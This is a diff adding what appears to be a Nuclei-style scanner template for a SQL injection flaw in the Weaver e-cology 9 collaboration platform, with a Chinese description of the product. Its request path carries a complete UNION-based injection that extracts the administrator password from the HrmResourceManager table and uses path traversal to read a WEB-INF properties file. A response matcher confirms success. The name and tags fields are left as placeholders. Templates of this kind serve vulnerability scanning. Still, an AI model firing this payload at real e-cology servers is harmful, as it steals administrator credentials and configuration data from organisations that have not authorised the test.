@@ -1,0 +1,18 @@
+id: E-Cology-FileDownloadLocation-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 泛微e-cology是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。泛微e-cology 9 x.FileDownloadLocation接口存在SQL注入漏洞
+  tags: tags
+variables:
+  username: "{{rand_base(6)}}"  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation?ddcode=7ea7ef3c41d67297&downfiletype=eml&download=1&mailId=1123+union+select+*+from+(select+1+as+resourceid,'../ecology/WEB-INF/prop/mobilemode.properties'+as+x2,'3'+as+x3,(select++*+from+(select+*+from+(select+password+from+HrmResourceManager+where+id=1)x)x)+as+x4,5+as+x5,6+as+x6)x+where+1=1&mailid=action.WorkflowFnaEffectNew&parentid=0"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'wx.corpid='
